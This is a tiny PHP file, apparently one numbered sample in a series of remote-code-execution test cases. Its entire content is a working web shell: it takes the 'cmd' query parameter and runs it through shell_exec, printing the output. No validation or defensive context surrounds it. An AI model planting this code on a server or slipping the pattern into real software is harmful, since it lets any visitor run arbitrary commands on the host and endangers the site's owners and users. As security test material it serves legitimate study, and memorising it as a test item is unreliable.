<?php
// RCE test variation #377
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>